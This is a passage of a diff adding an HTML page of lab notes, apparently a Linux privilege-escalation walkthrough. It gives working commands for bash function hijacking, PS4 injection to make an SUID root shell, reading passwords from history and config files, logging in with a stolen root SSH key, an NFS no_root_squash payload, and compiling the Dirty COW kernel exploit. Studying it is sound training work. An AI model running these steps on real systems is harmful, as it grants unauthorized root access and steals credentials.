+											src="env2.png"></span><br>
+									In <em>Bash</em> versions&nbsp;<strong>&lt; 4.2-048</strong> it is possible to
+									define <em>shell functions</em> with names that resemble <em>file paths</em>, then
+									<em>export</em> those functions so that they are used instead of any actual
+									executable at that file path.
+								</p>
+								<p> Verify the version of Bash installed on the Debian VM is less than
+									<strong>4.2-048</strong>:<br>
+									<code>/bin/bash --version</code><br>
+									<span alt="bash.png" src="bash.png"
+										class="internal-embed media-embed image-embed is-loaded"><img alt="bash.png"
+											src="bash.png"></span><br>
+									Create a <em>Bash function</em> with the name "<code>/usr/sbin/service</code>" that
+									executes a new Bash shell (using <em>-p</em> so permissions are preserved) and
+									export the function:<br>
+									<code>function /usr/sbin/service { /bin/bash -p; }</code><br>
+									<code>export -f /usr/sbin/service</code>
+								</p>
+								<p> Run the <strong>suid-env2</strong> executable to gain a root shell:<br>
+									<code>/usr/local/bin/suid-env2</code>
+								</p>
+							</li>
+							<li data-line="259">
+								<p><mark><strong>SUID / SGID Executables - Abusing Shell Features (#2)</strong></mark>
+								</p>
+								<p> <em>Bash</em> has a <em>debugging</em> mode which can be enabled with the
+									<strong>-x</strong> command line option, or by modifying the
+									<strong>SHELLOPTS</strong> environment variable to<br>
+									include <strong>xtrace</strong>. By default, <em>SHELLOPTS</em> is <em>read
+										only</em>, however the <strong>env</strong> command allows <em>SHELLOPTS</em> to
+									be set.</p>
+								<p> When in debugging mode, Bash uses the environment variable <strong>PS4</strong>
+									to<br>
+									<em>display</em> an extra prompt for debug statements. This variable can include
+									an<br>
+									<em>embedded command</em>, which will execute every time it is shown.
+								</p>
+								<p> If a <strong>SUID</strong> file runs another program via <em>Bash</em> (e.g. by
+									using <em>system()</em>) these environment variables can be inherited. If an
+									<em>SUID</em> file is being executed, this command will execute with the privileges
+									of the file owner. </p>
+								<p> <mark>Note: In Bash versions 4.4 and above, the PS4 environment variable is not
+										inherited by shells running as root and so this exploit won't work.</mark></p>
+								<p> Run the <code>/usr/local/bin/suid-env2</code> executable with <em>bash
+										debugging</em> enabled and the <em>PS4</em> variable set to an embedded command
+									which creates an <em>SUID</em> version of <code>/bin/bash</code>:</p>
+								<p> <code>env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2</code>
+								</p>
+								<p> Run the <code>/tmp/rootbash</code> executable with <strong>-p</strong> to gain a
+									shell running with <em>root privileges</em>:<br>
+									<code>/tmp/rootbash -p</code>
+								</p>
+							</li>
+							<li data-line="279">
+								<p><mark><strong>Passwords &amp; Keys - History Files</strong></mark></p>
+								<p> If a user accidentally types their password on the <em>command line</em> instead of
+									into a <em>password prompt</em>, it may get recorded in a <em>history file</em>.</p>
+								<p> View the contents of all the <em>hidden</em> history files in the user's home
+									directory:<br>
+									<code>cat ~/.*history | less</code><br>
+									<span alt="password1.png" src="password1.png"
+										class="internal-embed media-embed image-embed is-loaded"><img
+											alt="password1.png" src="password1.png"></span><br>
+									Note that the user has tried to connect to a <em>MySQL</em> server at some point,
+									using the "<strong>root</strong>" username and a password submitted via the command
+									line. Note that there is no space between the -p option and the <em>password</em>!
+								</p>
+								<p> Switch to the <em>root user</em>, using the password:<br>
+									<code>su root</code>
+								</p>
+							</li>
+							<li data-line="291">
+								<p><mark><strong>Passwords &amp; Keys - Config Files</strong></mark></p>
+								<p> <em>Config files</em> often contain passwords in <em>plaintext</em> or other
+									<em>reversible</em> formats. List the contents of the user's home directory:<br>
+									<code>ls /home/user</code>
+								</p>
+								<p> Note the presence of a&nbsp;<strong>myvpn.ovpn</strong> config file. View the
+									contents of the file:<br>
+									<code>cat /home/user/myvpn.ovpn</code><br>
+									<span alt="password2.png" src="password2.png"
+										class="internal-embed media-embed image-embed is-loaded"><img
+											alt="password2.png" src="password2.png"></span><br>
+									The file should contain a reference to another location where the root user's
+									credentials can be found. Switch to the <em>root user</em>, using the
+									credentials:<br>
+									<code>su root</code>
+								</p>
+							</li>
+							<li data-line="302">
+								<p><mark><strong>Passwords &amp; Keys - SSH Keys</strong></mark></p>
+								<p> Sometimes users make <em>backups</em> of important files but fail to secure them
+									with the <em>correct permissions</em>. Look for hidden files &amp; directories in
+									the system root:<br>
+									<code>ls -la /</code>
+								</p>
+								<p> Note that there appears to be a hidden directory called <strong>.ssh</strong>. View
+									the contents of the directory:<br>
+									<code>ls -l /.ssh</code>
+								</p>
+								<p> Note that there is a <em>world-readable</em> file called <strong>root_key</strong>.
+									Further inspection of this file should indicate it is a <em>private SSH key</em>.
+									The name of the file suggests it is for the <em>root</em> user.<br>
+									<span alt="root_key.png" src="root_key.png"
+										class="internal-embed media-embed image-embed is-loaded"><img alt="root_key.png"
+											src="root_key.png"></span><br>
+									Copy the key over to your <em>Kali</em> box (it's easier to just view the contents
+									of the <strong>root_key</strong>&nbsp;file and copy/paste the key)&nbsp;and give it
+									the correct permissions, otherwise your SSH client will refuse to use it:<br>
+									<code>chmod 600 root_key</code>
+								</p>
+								<p> Use the key to login to the Debian VM as the <em>root account</em> (note that due to
+									the age of the box, some additional settings are required when using SSH):<br>
+									<code>ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa</code><br>
+									<code>-oHostKeyAlgorithms=+ssh-rsa root@MACHINE_IP</code>
+								</p>
+							</li>
+							<li data-line="319">
+								<p><mark><strong>NFS</strong></mark></p>
+								<p> <strong>NFS</strong> (<em>Network File System</em>) is a popular distributed file
+									system. NFS shares are configured in the <code>/etc/exports</code> file. Remote
+									users can <em>mount</em> shares, <em>access</em>, <em>create</em>, <em>modify</em>
+									files. By default, created files inherit the remote user's id and group id (as owner
+									and group respectively), even if they don't exist on the NFS server.<br>
+									<span alt="NFS.png" src="NFS.png"
+										class="internal-embed media-embed image-embed is-loaded"><img alt="NFS.png"
+											src="nfs.png"></span><br>
+									<strong>Root Squashing</strong> is how NFS prevents an obvious privilege escalation.
+									If the remote user is (or claims to be) <em>root (uid=O)</em>, NFS will instead
+									"<mark>squash</mark>" the user and treat them as if they are the
+									"<mark>nobody</mark>" user, in the "<mark>nogroup</mark>" group. While this behavior
+									is default, it can be <em>disabled</em>!
+								</p>
+								<p> <code>no_root_squash</code> is an <em>NFS</em> configuration option which turns root
+									squashing <em>off</em>. When included in a <em>writable</em> share configuration, a
+									remote user who identifies as "<mark>root</mark>" can create files on the NFS share
+									as the <em>local root</em> user.</p>
+								<p> Check the <em>NFS share</em> configuration on the Debian VM:<br>
+									<code>cat /etc/exports</code><br>
+									<span alt="nfs_squash.png" src="nfs_squash.png"
+										class="internal-embed media-embed image-embed is-loaded"><img
+											alt="nfs_squash.png" src="nfs_squash.png"></span><br>
+									Note that the <code>/tmp</code> share has root squashing <em>disabled</em>. On your
+									Kali box, switch to your <em>root</em> user if you are not already running as
+									<em>root</em>. Using Kali's <em>root user</em>, create a mount point on your Kali
+									box and mount the <strong>/tmp</strong> share:
+								</p>
+								<p> <code>mkdir /tmp/nfs</code><br>
+									<code>mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs</code>
+								</p>
+								<p> Still using Kali's root user, generate a <em>payload</em> using
+									<strong>msfvenom</strong> and save it to the <em>mounted share</em> (this payload
+									simply calls <code>/bin/bash</code>):<br>
+									<code>msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf</code>
+								</p>
+								<p> Still using Kali's root user, make the file executable and set the <em>SUID</em>
+									permission:<br>
+									<code>chmod +xs /tmp/nfs/shell.elf</code>
+								</p>
+								<p> Back on the <em>Debian VM</em>, as the low <em>privileged</em> user account, execute
+									the file to gain a <em>root shell</em>:<br>
+									<code>/tmp/shell.elf</code>
+								</p>
+							</li>
+							<li data-line="344">
+								<p><strong><mark>Kernel Exploits</mark></strong></p>
+								<p> <em>Kernel exploits</em> can leave the system in an <em>unstable</em> state, which
+									is why you should only run them as a last resort.</p>
+								<p> Good Linux Enumeration Scripts like <strong>LinPeas</strong> automatically detect
+									the <em>Kernel Version</em> and suggest possible exploits but you can also use
+									specific programs like <strong><a data-tooltip-position="top"
+											aria-label="https://github.com/jondonas/linux-exploit-suggester-2"
+											rel="noopener" class="external-link"
+											href="https://github.com/jondonas/linux-exploit-suggester-2"
+											target="_blank">Linux Exploit Suggester 2</a></strong>.</p>
+								<p> Run the <strong>Linux Exploit Suggester 2</strong> tool to identify potential kernel
+									exploits on the current system:<br>
+									<code>perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl</code><br>
+									<span alt="kernel.png" src="kernel.png"
+										class="internal-embed media-embed image-embed is-loaded"><img alt="kernel.png"
+											src="kernel.png"></span><br>
+									The popular Linux kernel exploit <strong>"Dirty COW"</strong> should be listed. A
+									copy of exploit code for <em>Dirty COW</em> can be found
+									at&nbsp;<code>/home/user/tools/kernel-exploits/dirtycow/c0w.c</code>. It replaces
+									the <em>SUID</em> file <code>/usr/bin/passwd</code> with one that <em>spawns</em> a
+									shell (a backup of <code>/usr/bin/passwd</code> is made at <code>/tmp/bak</code>).
+								</p>
+								<p> Compile the code and run it (note that it may take several minutes to complete):<br>
+									<code>gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c</code><br>
+									<code>-o c0w ./c0w</code>
+								</p>
+								<p> Once the exploit completes, run&nbsp;<code>/usr/bin/passwd</code> to gain a root
+									shell. Remember to restore the original <code>/usr/bin/passwd</code> file and exit
+									the root shell before continuing!</p>
+							</li>
+						</ol>
+					</div>
+					<div class="mod-footer"></div>
+				</div>
+			</div>
+		</div>
+		<div class="sidebar-right sidebar">
+			<div class="sidebar-handle"></div>
+			<div class="sidebar-topbar">
+				<div class="topbar-content"></div>
+				<div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%"
+						height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"
+						stroke-linecap="round" stroke-linejoin="round" class="svg-icon">
+						<path
+							d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z">
+						</path>
+						<path d="M10 4V20"></path>
+						<path d="M4 7H7"></path>
+						<path d="M4 10H7"></path>
+						<path d="M4 13H7"></path>
+					</svg></div>
+			</div>
+			<div class="sidebar-content"></div>
+			<script
+				defer="">let rs = document.querySelector(".sidebar-right"); rs.classList.add("is-collapsed"); if (window.innerWidth > 768) rs.classList.remove("is-collapsed"); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script>
+		</div>
+	</div>
+</body>
+
+</html>
